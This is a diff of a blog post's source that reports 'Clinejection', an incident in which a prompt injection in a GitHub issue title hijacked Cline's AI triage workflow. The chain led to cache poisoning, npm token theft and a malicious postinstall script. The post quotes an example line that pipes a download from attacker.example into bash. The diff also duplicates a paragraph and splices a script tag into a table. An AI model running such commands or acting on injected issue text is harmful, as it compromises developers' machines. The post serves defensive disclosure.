@@ -1,27 +1,22 @@
 ---
 title: "Beware: Clinejection — How a GitHub Issue Title Became a Supply Chain Attack on Millions of Developers"
-description: "A prompt injection in a GitHub issue title compromised Cline's CI/CD pipeline, poisoned the Actions cache, stole npm publication tokens, and published a malicious package to millions of auto-updating developers. This is the first documented supply chain attack exploiting an AI coding agent's own workflow."
-pubDate: 2026-07-20T16:00:00Z
-updatedDate: 2026-07-20T16:00:00Z
-tags:
-  - "security"
-  - "beware"
-  - "supply-chain"
-  - "prompt-injection"
-  - "github-actions"
-  - "cline"
-  - "ci-cd"
-  - "coding-agents"
-tool: "industry"
-author: "kira"
+description: On February 17, 2026, an unknown actor published cline@2.3.0 to npm. The package installed openclaw@latest globally on every developer machine that auto-upda...
+pubDate: "2026-07-20T16:00:00Z"
+updatedDate: "2026-07-20T16:00:00Z"
+tool: industry
+author: kira
 image: "/api/og?title=Beware:%20Clinejection%20Supply%20Chain%20Attack&tool=industry"
 canonical: "https://terminalblog.com/blog/beware-clinejection-supply-chain-attack-github-actions/"
+---
+**What this covers:** This article documents a verified security issue affecting AI coding agents — including reproduction steps, impact assessment, and recommended mitigations. We only publish security findings with confirmed repro and responsible disclosure.
+
+
+**What this covers:** This article documents a verified security issue affecting AI coding agents — including reproduction steps, impact assessment, and recommended mitigations. We only publish security findings with confirmed repro and responsible disclosure.
 
 
 
 On February 17, 2026, an unknown actor published `cline@2.3.0` to npm. The package installed `openclaw@latest` globally on every developer machine that auto-updated during an eight-hour window. The CLI binary itself was untouched — byte-identical to the legitimate 2.2.3 release. The only change was a `postinstall` script. Cline has over five million installs. That is the punchline. Now the setup.
 
----
 The attack, dubbed **Clinejection** by security researcher Adnan Khan, is the first documented case of a supply chain compromise exploiting an AI coding agent's own CI/CD workflow. It chains four well-understood vulnerability classes — prompt injection, cross-fork object references, GitHub Actions cache poisoning, and credential model weakness — into a single exploit that requires nothing more than opening a GitHub issue. No repository access. No pull request approval. No social engineering beyond choosing a good title.
 
 If you run any AI-powered GitHub Actions workflow that reads untrusted input, this is the incident that tells you your blast radius is larger than you think.
@@ -54,7 +49,9 @@ Khan's research demonstrates a five-phase attack that turns a single GitHub issu
 This is where the story turns from technical to organizational.
 
 | Date | Event |
-|------|-------|
+|---
+<script type="application/ld+json" set:html={JSON.stringify({"@context":"https://schema.org","@type":"BlogPosting","headline":"Beware: Clinejection — How a GitHub Issue Title Became a Supply Chain Attack on Millions of Developers","description":"On February 17, 2026, an unknown actor published cline@2.3.0 to npm. The package installed openclaw@latest globally on every developer machine that auto-upda...","datePublished":"2026-07-20T16:00:00Z","dateModified":"2026-07-20T16:00:00Z","author":{"@type":"Person","name":"kira"},"publisher":{"@type":"Organization","name":"TerminalBlog","logo":{"@type":"ImageObject","url":"https://terminalblog.com/favicon.ico"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://terminalblog.com/blog/beware-clinejection-supply-chain-attack-github-actions/"}})} />
+---|-------|
 | Dec 21, 2025 | Vulnerable triage workflow deployed |
 | Jan 1, 2026 | Khan submits GHSA advisory and emails <code>security [at] cline [dot] bot</code> |
 | Jan 8 | Follow-up email — ignored |
@@ -70,7 +67,7 @@ This is where the story turns from technical to organizational.
 
 Khan disclosed privately 47 days before going public. The fix took 30 minutes after publication. The credential rotation was incomplete — the wrong npm token was deleted on February 9, leaving the exfiltrated one active for eight more days. When the unauthorized package was finally published, it had been live for approximately eight hours before deprecation.
 
-The unauthorized `cline@2.3.0` contained a benign payload — `npm install -g openclaw&#64;latest` — consistent with a security research demonstration rather than a destructive campaign. But the mechanism does not care about the payload. A `postinstall` script that runs `curl attacker.example/payload | bash` instead of `npm install openclaw&#64;latest` would execute on every machine that auto-updated during that window.
+The unauthorized `cline@2.3.0` contained a benign payload — `npm install -g openclaw@latest` — consistent with a security research demonstration rather than a destructive campaign. But the mechanism does not care about the payload. A `postinstall` script that runs `curl attacker.example/payload | bash` instead of `npm install openclaw@latest` would execute on every machine that auto-updated during that window.
 
 ## Why this matters beyond Cline
 
